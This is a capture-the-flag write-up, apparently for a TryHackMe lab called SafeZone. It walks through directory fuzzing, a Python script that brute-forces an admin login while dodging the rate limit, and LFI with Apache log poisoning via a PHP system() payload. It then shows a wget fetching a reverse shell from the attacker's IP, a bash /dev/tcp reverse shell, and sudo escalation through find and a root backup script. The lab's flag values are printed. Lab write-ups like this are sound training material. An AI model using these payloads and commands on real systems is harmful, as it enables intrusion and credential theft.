---
sticker: emoji//1f9ba
---
# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |




# RECONNAISSANCE
---

Let's check the web application

![](cybersecurity/images/Pasted%2520image%252020250519124539.png)

Seems like we need to add `safezone.thm` to `/etc/hosts`, after we add it, we can fuzz:


```
ffuf -w /usr/share/dirb/wordlists/common.txt:FUZZ -u "http://safezone.thm/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://safezone.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Extensions       : .php .html .txt .git
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 503, Words: 139, Lines: 24, Duration: 176ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
.hta.git                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
.hta.php                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 177ms]
.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 179ms]
.hta.html               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
.hta.txt                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
.htaccess.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
.htaccess.html          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 177ms]
.htaccess.git           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 177ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 180ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 180ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 188ms]
.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1418ms]
.htpasswd.html          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2419ms]
.htpasswd.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2420ms]
.htpasswd.git           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3422ms]
dashboard.php           [Status: 302, Size: 922, Words: 94, Lines: 58, Duration: 176ms]
detail.php              [Status: 302, Size: 1103, Words: 99, Lines: 118, Duration: 176ms]
index.html              [Status: 200, Size: 503, Words: 139, Lines: 24, Duration: 175ms]
index.php               [Status: 200, Size: 2372, Words: 706, Lines: 47, Duration: 176ms]
index.html              [Status: 200, Size: 503, Words: 139, Lines: 24, Duration: 175ms]
index.php               [Status: 200, Size: 2372, Words: 706, Lines: 47, Duration: 182ms]
logout.php              [Status: 200, Size: 54, Words: 1, Lines: 3, Duration: 296ms]
news.php                [Status: 302, Size: 922, Words: 94, Lines: 58, Duration: 178ms]
note.txt                [Status: 200, Size: 121, Words: 20, Lines: 4, Duration: 176ms]
register.php            [Status: 200, Size: 2334, Words: 701, Lines: 46, Duration: 177ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 176ms]
```

We got a bunch of stuff, let's read `note.txt` first:

![](cybersecurity/images/Pasted%2520image%252020250519125535.png)


Let's go to `register.php` to register an account:

![](cybersecurity/images/Pasted%2520image%252020250519125628.png)


![](cybersecurity/images/Pasted%2520image%252020250519125701.png)


We got some tabs, if we go to `news.php`, we can see this:

![](cybersecurity/images/Pasted%2520image%252020250519125732.png)

![](cybersecurity/images/Pasted%2520image%252020250519125742.png)

`contact.php` does not exist, let's go to `details.php`:

![](cybersecurity/images/Pasted%2520image%252020250519125820.png)

Inside of here, we can find this:

![](cybersecurity/images/Pasted%2520image%252020250519125840.png)


Based on the info, there seems to be some sort of `LFI` inside of here, let's use Caido:

![](cybersecurity/images/Pasted%2520image%252020250519130341.png)

I tried automating this using `caido automate` functionality but it failed, it seems like the `LFI` may only work as the admin user, let's try to fuzz again to check for any other directory we could be missing, in this case, i will change use `gobuster`:

```
gobuster dir -u http://safezone.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 20 2>/dev/null
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://safezone.thm/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
/~files               (Status: 301) [Size: 313] [--> http://safezone.thm/~files/]
```

We found the `/~files` directory, this must point to the same directory the admin was talking about on the note, let's go to `/~files/pass.txt` to check if its true:

![](cybersecurity/images/Pasted%2520image%252020250519131015.png)

Let's proceed to exploitation.



# EXPLOITATION
---

We can use a python script to exploit that and get the password, the issue relies that every 3 attempts, we get a timeout which makes it hard to get the password, for that, we need to create a custom python script to help us get the password:

```python
import requests
from itertools import product

# Target URL
URL = 'http://safezone.thm/index.php'

# Headers copied from your curl for fidelity
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://safezone.thm',
    'Connection': 'keep-alive',
    'Referer': 'http://safezone.thm/index.php',
    'Upgrade-Insecure-Requests': '1',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache'
}

# Dummy account (resets lockout)
DUMMY_CREDS = {
    'username': 'test',
    'password': 'test',
    'submit': 'Submit'
}

# Admin fuzz template
def admin_creds(passwd: str):
    return {
        'username': 'Admin',
        'password': passwd,
        'submit': 'Submit'
    }

def main():
    session = requests.Session()
    session.headers.update(HEADERS)

    # Iterate through admin00admin … admin99admin
    for x, y in product(range(10), repeat=2):
        trypass = f"admin{x}{y}admin"
        print(f"[+] Trying {trypass}…", end=" ")

        # 1) Reset the rate‐limit by logging in as your test user
        session.post(URL, data=DUMMY_CREDS, allow_redirects=True)

        # 2) Immediately try the admin login
        resp = session.post(URL, data=admin_creds(trypass), allow_redirects=True)

        body = resp.text

        # Check for failure messages
        if "Please enter valid login details" in body or "Too many failed" in body:
            print("✗")
        else:
            print("✅  SUCCESS!")
            print(f"    → admin password is: {trypass}")
            return

    print("[-] Exhausted all guesses.")

if __name__ == "__main__":
    main()

```

The script allows us to bypass the restriction by doing a `POST` request to our test account to prevent the limit-rate, we also use `requests.Session()` to use the cookie from our test session in order to avoid the limit-rate, once we run the script, we get this:

```python
python3 exploit.py
[+] Trying admin00admin… ✗
[+] Trying admin01admin… ✗
[+] Trying admin02admin… ✗
[+] Trying admin03admin… ✗
[+] Trying admin04admin… ✗
[+] Trying admin05admin… ✗
[+] Trying admin06admin… ✗
[+] Trying admin07admin… ✗
[+] Trying admin08admin… ✗
[+] Trying admin09admin… ✗
[+] Trying admin10admin… ✗
[+] Trying admin11admin… ✗
[+] Trying admin12admin… ✗
[+] Trying admin13admin… ✗
[+] Trying admin14admin… ✗
[+] Trying admin15admin… ✗
[+] Trying admin16admin… ✗
[+] Trying admin17admin… ✗
[+] Trying admin18admin… ✗
[+] Trying admin19admin… ✗
[+] Trying admin20admin… ✗
[+] Trying admin21admin… ✗
[+] Trying admin22admin… ✗
[+] Trying admin23admin… ✗
[+] Trying admin24admin… ✗
[+] Trying admin25admin… ✗
[+] Trying admin26admin… ✗
[+] Trying admin27admin… ✗
[+] Trying admin28admin… ✗
[+] Trying admin29admin… ✗
[+] Trying admin30admin… ✗
[+] Trying admin31admin… ✗
[+] Trying admin32admin… ✗
[+] Trying admin33admin… ✗
[+] Trying admin34admin… ✗
[+] Trying admin35admin… ✗
[+] Trying admin36admin… ✗
[+] Trying admin37admin… ✗
[+] Trying admin38admin… ✗
[+] Trying admin39admin… ✗
[+] Trying admin40admin… ✗
[+] Trying admin41admin… ✗
[+] Trying admin42admin… ✗
[+] Trying admin43admin… ✗
[+] Trying admin44admin… ✅  SUCCESS!
    → admin password is: admin44admin
```


We got our credentials:

```
admin:admin44admin
```

![](cybersecurity/images/Pasted%2520image%252020250519193418.png)

We are now able to get access to the admin panel, let's check the `details.php` page:

![](cybersecurity/images/Pasted%2520image%252020250519193521.png)

As seen, it changed, `LFI` works now, knowing this, we can achieve `RCE` using this:

![](cybersecurity/images/Pasted%2520image%252020250519195900.png)

Using `/var/log/apache2/access.log`, we can download a reverse shell into the server and execute it, we need to host the file in a python server, then use:

```
?page=/var/log/apache2/access.log&cmd=wget 10.14.21.28:8000/rev.php -O /home/files/rev.php
```

Before this, let's test the `rce`, we need to use this:

```php
<?php system($_GET['cmd']); ?>
```

On the `User-Agent`, then, send the request twice so we can see the `rce`:

![](cybersecurity/images/Pasted%2520image%252020250519203456.png)

As seen, we got `rce`, let's do the command from before then:

![](cybersecurity/images/Pasted%2520image%252020250519203554.png)

![](cybersecurity/images/Pasted%2520image%252020250519203603.png)

We got the request on our server, we only need to access the file through the `lfi` again and have our listener ready:

![](cybersecurity/images/Pasted%2520image%252020250519203655.png)

![](cybersecurity/images/Pasted%2520image%252020250519203704.png)

We got our shell, let's begin privilege escalation.




# PRIVILEGE ESCALATION
---


First step is to stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![](cybersecurity/images/Pasted%2520image%252020250519203804.png)

With our stable shell, we can now look around the box, for example, if we use `sudo -l`, we get this:

```
www-data@safezone:/$ sudo -l
Matching Defaults entries for www-data on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User www-data may run the following commands on safezone:
    (files) NOPASSWD: /usr/bin/find
```

On `GTFOBINS`, we can find this info on how to exploit this:

![](cybersecurity/images/Pasted%2520image%252020250519203911.png)

Let's do:

```
sudo -u files /usr/bin/find . -exec /bin/bash \; -quit
```

![](cybersecurity/images/Pasted%2520image%252020250519204031.png)

There we go, let's check our privileges again:

```
files@safezone:/$ sudo -l
Matching Defaults entries for files on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User files may run the following commands on safezone:
    (yash) NOPASSWD: /usr/bin/id
```

I couldn't find any info on how to exploit this on `gtfobins`, let's leave it like that for now and proceed to check more stuff, for example, we can find this inside of `/home/files/`:

```
files@safezone:/$ ls -la /home/files
total 48
drwxrwxrwx 5 files    files    4096 May 20 07:04  .
drwxr-xr-x 4 root     root     4096 Jan 29  2021  ..
-rw------- 1 files    files       0 Mar 29  2021  .bash_history
-rw-r--r-- 1 files    files     220 Jan 29  2021  .bash_logout
-rw-r--r-- 1 files    files    3771 Jan 29  2021  .bashrc
drwx------ 2 files    files    4096 Jan 29  2021  .cache
drwx------ 3 files    files    4096 Jan 29  2021  .gnupg
drwxrwxr-x 3 files    files    4096 Jan 30  2021  .local
-rw-r--r-- 1 files    files     807 Jan 29  2021  .profile
-rw-r--r-- 1 root     root      105 Jan 29  2021 '.something#fake_can@be^here'
-rwxrwxrwx 1 root     root      112 Jan 29  2021  pass.txt
-rw-r--r-- 1 www-data www-data 5493 May 20 06:39  rev.ph
```


We got `.something#fake_can@be^here`:

```
files@safezone:~$ cat .something#fake_can@be\^here
files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.
```

We got a hash, let's crack it using john:

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
magic            (?)
```

We got the credentials, let's switch to ssh:


![](cybersecurity/images/Pasted%2520image%252020250519211619.png)

Let's use linpeas:

![](cybersecurity/images/Pasted%2520image%252020250519211933.png)

Something is running on port `8000`, most likely a website, let's use port tunneling to check the contents:

```
ssh -L 9000:localhost:8000 files@safezone.thm -fN
```

![](cybersecurity/images/Pasted%2520image%252020250519212024.png)

It says forbidden but we can still fuzz, let's do it:

```
ffuf -w /usr/share/dirb/wordlists/common.txt:FUZZ -u "http://localhost:9000/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost:9000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Extensions       : .php .html .txt .git
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.html                   [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 531ms]
.hta                    [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 546ms]
.hta.git                [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 547ms]
.hta.txt                [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 547ms]
.hta.html               [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 547ms]
.htpasswd.txt           [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 546ms]
.htaccess               [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 546ms]
.htpasswd.html          [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 547ms]
.htpasswd               [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 694ms]
.htaccess.git           [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 694ms]
.htaccess.txt           [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 694ms]
.htpasswd.git           [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 704ms]
.htaccess.html          [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 874ms]
cgi-bin/.html           [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 175ms]
login.html              [Status: 200, Size: 462, Words: 21, Lines: 19, Duration: 176ms]
```


We got a login page:



![](cybersecurity/images/Pasted%2520image%252020250519212128.png)


If we inspect the source code, we can find this:

![](cybersecurity/images/Pasted%2520image%252020250519212145.png)

There's a `login.js` file, inside of it, we can find this:

![](cybersecurity/images/Pasted%2520image%252020250519212206.png)

We got credentials, once we login, we can see this:

![](cybersecurity/images/Pasted%2520image%252020250519212235.png)

We can write messages for `yash`, if we try some commands they don't work, such as id or whoami, but, we can use `echo` to create a file:




![](cybersecurity/images/Pasted%2520image%252020250519212359.png)

![](cybersecurity/images/Pasted%2520image%252020250519212410.png)

As seen, it does create the file in our home, we can now create another file to send us a reverse shell as yash:


```
echo '' > /home/files/shell.sh
```

We now need to give the files permissions:

```
chmod 777 /home/files/reverse.sh
```

We can now change the contents to a reverse shell:

```bash
#!/bin/bash

bash -i >& /dev/tcp/IP/9001 0>&1
```


We now need to execute the file and get our shell if we have our listener ready:

![](cybersecurity/images/Pasted%2520image%252020250519213847.png)

We can now stabilize it again:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![](cybersecurity/images/Pasted%2520image%252020250519213957.png)

If we check our privileges, we can check this:

```
yash@safezone:/opt$ sudo -l
Matching Defaults entries for yash on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User yash may run the following commands on safezone:
    (root) NOPASSWD: /usr/bin/python3 /root/bk.py
```

We can run that script as root, let's use it first to check how it works:

```
yash@safezone:/opt$ sudo /usr/bin/python3 /root/bk.py
Enter filename:
Enter destination:
Enter Password:
Usage: sshpass [-f|-d|-p|-e] [-hV] command parameters
   -f filename   Take password to use from file
   -d number     Use number as file descriptor for getting password
   -p password   Provide password as argument (security unwise)
   -e            Password is passed as env-var "SSHPASS"
   With no parameters - password will be taken from stdin

   -P prompt     Which string should sshpass search for to detect a password prompt
   -v            Be verbose about what you're doing
   -h            Show help (this screen)
   -V            Print version information
At most one of -f, -d, -p or -e should be used
yash@safezone:/opt$
```

Seems like we can backup files, we can simply backup `root.txt` and finish the ctf:

```
yash@safezone:/opt$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /root/root.txt
Enter destination: /home/yash/root.txt
Enter Password: test
```

Using any password still backups the file, we can now read both flags:

```
yash@safezone:/opt$ cat /home/yash/flag.txt
THM{c296539f3286a899d8b3f6632fd62274}

yash@safezone:/opt$ cat /home/yash/root.txt
THM{63a9f0ea7bb98050796b649e85481845}
```

![](cybersecurity/images/Pasted%2520image%252020250519214356.png)

